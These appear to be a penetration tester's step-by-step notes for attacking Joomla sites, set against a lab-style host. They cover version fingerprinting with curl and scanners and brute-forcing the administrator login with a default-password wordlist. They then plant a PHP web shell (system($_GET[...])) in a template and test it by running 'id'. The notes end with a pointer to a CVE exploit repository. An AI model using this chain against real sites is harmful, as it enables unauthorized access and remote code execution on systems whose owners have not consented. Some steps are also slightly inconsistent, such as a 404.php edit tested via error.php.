
# Discovery/Footprinting Versions

`grep joomla`
```shell-session
$ curl -s http://dev.ad.someorg.local/ | grep Joomla
```

`robots.txt`
```
curl -s http://dev.ad.someorg.local/robots.txt
```

`checking for readme.txt (contains version)`
```shell-session
$ curl -s http://dev.ad.someorg.local/README.txt | head -n 5
```

In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`

`version fingerprint via js files`
```shell-session
curl -s http://dev.ad.someorg.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`.

```shell-session
$ sudo pip3 install droopescan
```

`run droopscan`
```shell-session
$ droopescan scan joomla --url http://dev.ad.someorg.local/
```


##### joomla scan

can help us  find accessible directories and files and may help with fingerprinting installed extensions
`joomlscan `
```
git clone https://github.com/drego85/JoomlaScan/blob/master/joomlascan.py
sudo python2.7 -m pip install urllib3
sudo python2.7 -m pip install certifi
sudo python2.7 -m pip install bs4

$ python2.7 joomlascan.py -u http://dev.ad.someorg.local
```

## admin portal

`http://dev.ad.someorg.local/administrator/index.php`

 generic auth msgs:
```
Warning
Username and password do not match or you do not have an account yet.1
```

 bruteforcing admin portal:

`default user is admin but the password is set at install, so we need to rely on weak pass and bruteforcing`

`install brute tool`
```
git clone https://github.com/ajnik/joomla-bruteforce.git
```
`joomla auth brute`
```shell-session
$ sudo python3 joomla-brute.py -u http://app.ad.someorg.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 
admin:admin
```

## ENUM AND  ATTACKS
we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.
From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.
Next, we can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.

`ADD TO 404.php Template`
```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

`test websh`
```shell-session
curl -s http://dev.ad.someorg.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

### Known vulnerabilities

`target version: 3.10`
`check the release date for your version here, then look for exploits that target the same year...`
https://www.joomla.org/announcements/release-news
	https://github.com/dpgg101/CVE-2019-10945.git